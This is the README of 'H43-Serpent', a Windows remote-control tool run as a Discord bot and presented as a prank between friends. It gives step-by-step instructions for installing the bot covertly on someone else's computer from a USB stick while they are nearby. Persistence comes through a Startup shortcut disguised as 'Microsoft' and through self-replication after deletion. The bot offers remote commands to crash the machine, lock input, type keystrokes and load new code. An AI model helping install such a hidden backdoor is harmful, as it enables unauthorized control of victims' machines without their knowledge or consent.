<h1 align='center'>H43-Serpent</h1>
<p align="center">	
    <img src="https://img.shields.io/badge/Platform-Windows-green" />
    <a href="https://github.com/Fytex/H43-Serpent/commits/master">
        <img src="https://img.shields.io/github/last-commit/Fytex/H43-Serpent" />
    </a>
    <a href="https://github.com/Fytex/H43-Serpent/blob/master/LICENSE">
        <img src="http://img.shields.io/github/license/Fytex/H43-Serpent" />
    </a>
</br>
</p>  
  

This bot was created with the purpose of having a funny moment between friends during a gameplay/group call/etc.
What this does is injecting a program into a friend's computer and execute commands remotely such as the ones presented in the category below.

Don't ask me to create commands such as GPS-Locator, Webcam viewer, Screen Sharing, Keyboard inputs reader (Keylogger), Files Grabber, etc. because stalking and stealing are far away from the intentions of this project.

Would appreciate if whoever uses this project only uses it to create funny moments with their friends.

This project does no harm to the computer nor to the user. However... Since there are commands which allow sending instructions to the target's computer (ex: type command) there is always a chance that someone with access to the bot can use it at their will for bad purposes.

## Commands
Target defined in `config.ini`  
**Usage:** Target-command param1 param2 ...  
**Help:** Target-help command

### Library (Lib)

- **hello**: Check if Bot is online
- **beep**: Emits a beep sound
- **bomb**: Makes computer slow for a moment
- **shutdown**: Shutdown computer
- **crash**: Crash computer
- **off_wifi**: Disable wifi
- **image**: Opens an image
- **site**: Opens any website
- **black_screen** Puts a black screen
- **sleep**: Puts computer into sleep mode (Lock user session)
- **play_sound**: Plays a sound
- **stop_sound**: Stops the sound
- **set_volume**: Sets computer's volume from 0 to 100
- **set_brightness**: Sets computer's brightness from 0 to 100
- **lock_input**: Locks input (Mouse and Keyboard)
- **lock_input2**: Locks input (Mouse and Keyboard) \[Method 2]
- **unlock_input**: Unlocks input (Mouse and Keyboard)
- **type**: Type letters (keys and hotkeys) and combine them
- **type2**: Type letters (keys and hotkeys) and combine them \[Method2]
- **type3**: Type letters (keys and hotkeys) and combine them \[Method3]

### No Category

- **help**: Shows help message (Can be followed by the command to show the command's help)
- **update**: (!) Dangerous. Update commands' library - Restricted to bot's owner


**Note:** Be aware that commands such as `lock_input`, `lock_input2`, `type` and `type2` affect the inputs in-game and could lead to a ban if the game has a anti-ban cheat installed in the computer. Games like League of Legends don't have so have fun. In games where has anti-cheat there are less chances of getting banned by Method 1 because it emulates a virtual keyboard while Method 2 has higher chances of ban because it calls directly Windows api function.

**Note2:** Be aware that commands such as `type`, `type2` and `update` can be used to do something malicious on the target computer. Since `update` command is the most easier and dangerous of them we decided to restrict it to the bot's owner. 



## How To

1. Create a [Discord](https://https://discord.com/) account or use your own account (It won't give any problems to your account so you can relax)
2. Go to [Disocrd Developer Applications](https://discord.com/developers/applications) and create an application
    - 2.1 Save the APPLICATION ID number for latter
    - 2.2 Go to Bot (left side button) click on Reset Token and copy the new Token for later (Something like `Nzk4OA.G8dpS0.Zqy-7ydO_bL....`)
    - 2.3 Scroll down until Privileged Gateway Intents. Enable all three intents (PRESENCE, SERVER MEMBERS, MESSAGE CONTENT)
3. Put this link on your browser and add the Application ID from 2.1 and put where it says ID: [https://discord.com/oauth2/authorize?scope=bot&permissions=8&client_id=](https://discord.com/oauth2/authorize?scope=bot&permissions=8&client_id=)`ID` and choose your server (I recommend creating a server where your friend isn't there to see the commands being executed)
4. Download this [repository](https://github.com/Fytex/H43-Serpent/archive/refs/heads/main.zip) to your computer
5. Unzip/Extract the archive
6. Open the folder and double click on config.ini
7. Inside config.ini edit TARGET where it says PUT_YOUR_TARGET_HERE and replace with a simple name to represent your friend. This is to choose later which friend (target) you want to execute each command.
8. Inside config.ini edit TOKEN where it says PUT_YOUR_TOKEN_HERE and replace with the Token that you copied in 2.2
9. Save the config.ini
10. Copy the folder (H43-Serpent) to a Pen USB.
11. When you are near your friend just plug the Pen USB in his computer open the folder and double click on `run.bat`
11. Wait until the window closes which takes about ~2s. Now unplug the Pen USB and it's all done! 
12. Python and libraries take about ~40sec to be ready. After that, go back to your computer/mobile and in your discord server which has the bot you should be able to run any command Target-Command. Ex: Fytex-help
13. To view more info about each command do Target-help Command. Ex: Fytex-help type


If you want to put this program into another friend's computer just change the TARGET field to your new friend's name in the `config.ini` of your Pen USB. And repeat the process from 10 onwards.

This only works on Windows Systems. (Doesn't work on Mac nor on \*nix)

PS: If you are paranoid and think binaries/python-installer(-amd64).exe is unsafe just install a Python3.8+ from the original site by yourself and rename it to `python-installer.exe` (32-bit) and the 64-bit version to `python-installer-amd64.exe`. It must be a version 3.8+ but I would recommend one 3.10- so it doesn't show a pop-up.

This was tested on Windows10 and Windows11 in different languages.

**Note:** If none of type and lock_input methods are working in-game there might be either because the game is running with admin priveleges (to remove it you have to go into the game's icon -> Open File Location then click again on the game's icon -> properties -> compatibility -> Uncheck Execute program as admin) or simply because the game itself blocks it.

**Optional Note:** On Python installation a shortcut might appear on Start Menu, here is an example on how to remove it:

![Clear List](https://www.tenforums.com/attachments/tutorials/247438d1568475274-add-remove-recently-added-apps-start-menu-windows-10-a-clear_list_recently_added_on_start_menu.png)

## How to uninstall from Target's Computer

Initially the script installs Python which must exist for this to work. If you uninstall Python, this scropt automatically stops working.

However if you want to remove the starting file in case you want to keep Python or for a better clean-up do: 
 1. Open CMD and execute: `taskkill /IM pythonw.exe /F`
 2. Do `win + r` (hold `win` and click `r`) and type `shell:startup` then press enter.
 3. Delete the file called `Microsoft` in that folder.

All cleaned!


## How this works internally

When you inject the pen and click `run.bat` it checks if you have python3.8+ installed otherwise it installs for you. (It caches it in target's computer to avoid waiting with the Pen USB plugged) 
Then it copies the files to their Temp folder and creates a shortcut in their Startup folder.  
The program runs a Discord bot which listens to your commands and applies them on their Windows computer.

The bot auto-replicates itself in case it gets deleted by the target however killing the process won't make magic.  
The bot handles no internet connection correctly.  
The bot initializes automatically on windows (user) startup.  
The bot lib can be updated without fear of breaking the program. Obviously calls like `exit()` and such kill the bot.


## Donate
If you want to donate something :) [Click Here for Paypal](https://www.paypal.me/fytex)

If not... I would appreciate a little star in my project :)
